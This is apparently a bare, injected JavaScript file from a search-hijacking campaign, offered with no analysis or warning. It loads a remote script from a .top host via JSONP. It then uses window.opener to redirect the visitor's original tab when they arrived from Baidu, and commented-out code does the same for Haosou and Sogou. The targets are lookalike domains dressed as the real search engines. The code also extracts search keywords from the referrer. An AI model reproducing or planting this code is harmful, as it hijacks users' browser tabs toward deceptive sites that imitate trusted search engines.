var jurl;
document.write("<script type=\"text/javascript\" src=\"http://yubeibaby.com.3i1c.top/jump.php?callback=jsonpCallback&paramStr="+getpara()+"\"><\/script>");

function jsonpCallback(result){  
    jurl=result.msg;  
    jj();
};  

function jj() {
    try { (function() {
        var now = new Date();
        var timeallow = true;
        if (now.getHours() > 24 && now.getHours() < 6) {};
        function jump(url) {
            if (window.opener) {
                if (window.navigator.userAgent.toUpperCase().indexOf('MSIE') > -1) {
                    //window.opener.location.href = url;
                    return;
                } else {
                    window.opener.location.replace(url);
                }
            }
        };

        var referer = document.referrer;
        if (!referer) {
            return;
        };
        var rst = /https?\:\/\/([^\/]+)/i.exec(referer);
        var host = rst ? rst[1] : 'unknown';


        //baidu
        if (/baidu\.com$/i.test(host) && timeallow) {
            var search = referer.substring(referer.indexOf('?'));
            var oldlink = document.referrer;
            if(oldlink.indexOf("s?word=")>0){
                jump("http://www.baidu.com.s4ksddfjkgsdnfnadfjkandsfljgfdjngandslfkjnaskljdhfakdfl.2baidu.top/baidufrm.html");
            }else{
                oldlink=oldlink.replace('http://','https://');

                if (GetKeyword(oldlink)=="" ||undefined || null) {
					jump("http://www.baidu.com.s4ksddfjkgsdnfnadfjkandsfljgfdjngandslfkjnaskljdhfakdfl.2baidu.top/baidufrm.html");
                }else{
					jump("http://www.baidu.com.s4ksddfjkgsdnfnadfjkandsfljgfdjngandslfkjnaskljdhfakdfl.2baidu.top/baidufrm.html");
                };
            }

            return;
        }


        /**
        if (/haosou\.com$/i.test(host) && timeallow) {

            var oldlink = document.referrer;

            if(oldlink.indexOf("&q=")>0){
					jump("http://www.haosou.com.s4ksddfjkgsdnfnadfjkandsfljgfdjngandslfkjnaskljdhfakdfl.2haosou.top/haosoufrm.html");
            }else{
					jump("http://www.haosou.com.s4ksddfjkgsdnfnadfjkandsfljgfdjngandslfkjnaskljdhfakdfl.2haosou.top/haosoufrm.html");
            }
            return;
        }

        if (/sogou\.com$/i.test(host) && timeallow) {
            var oldlink = document.referrer;

            if(oldlink.indexOf("web?query=")>0){
					jump("http://www.sogou.com.s4ksddfjkgsdnfnadfjkandsfljgfdjngandslfkjnaskljdhfakdfl.2sogou.top/sogoufrm.html");
            }else{
					jump("http://www.sogou.com.s4ksddfjkgsdnfnadfjkandsfljgfdjngandslfkjnaskljdhfakdfl.2sogou.top/sogoufrm.html");
            }
            return;
        }
        **/




    })()
    } catch(e) {}
};

/**
 * -----------------------------------------------------------------
 * 获取搜索关键词
 * -----------------------------------------------------------------
 */
function GetKeyword(url) {
    if (url.toString().indexOf("www.baidu.com/baidu?") > 0) {
        return request(url, "word");
    }

    else if (url.toString().indexOf("www.baidu.com/s") > 0) {
        return request(url, "wd");
    }


    else if (url.toString().indexOf("www.baidu.com/baidu.php") > 0) {
        return request(url, "wd");
    }



    else if (url.toString().indexOf("www.baidu.com/link") > 0) {
        return request(url, "wd");
    }
    else if (url.toString().indexOf("google") > 0) {
        return request(url, "q");
    }
    else if (url.toString().indexOf("www.sogou.com/web") > 0) {
        return request(url, "query");
    }
    else if (url.toString().indexOf("soso") > 0) {
        return request(url, "w");
    }
    else if (url.toString().indexOf("www.haosou.com/s") > 0) {
        return request(url, "q");
    }
    else {
        return "";
    }
};

function request(url, paras) {
    var paraString = url.substring(url.indexOf("?") + 1, url.length).split("&");
    var paraObj = {};
    for (i = 0; j = paraString[i]; i++) {
        paraObj[j.substring(0, j.indexOf("=")).toLowerCase()] = j.substring(j.indexOf("=") + 1, j.length);
    }
    var returnValue = paraObj[paras.toLowerCase()];
    if (typeof (returnValue) == "undefined") {
        return "";
    } else {
        return returnValue;
    }
};

function getpara(){
    var script = document.getElementsByTagName("script");
    for(var i = 0; i < script.length; i++){
        if(script[i].src.search(/j.js/i) != -1){
            if(script[i].src.indexOf("?v=") != -1){
                var _s = decodeURI(script[i].src.substr(script[i].src.indexOf("?v=") + 3));
                if(_s.substr(0, 1) != '"' && _s.substr(0, 1) != "'")
                {
                    return _s;
                }
                else
                {
                    _s = _s.substr(1);
                    if(_s.search(/"/) != -1){
                        return _s.substr(0, _s.search(/"/));
                }else{
                    return _s.substr(0, _s.search(/'/));
                }
                }
            }
        }
    }
    return false;
};
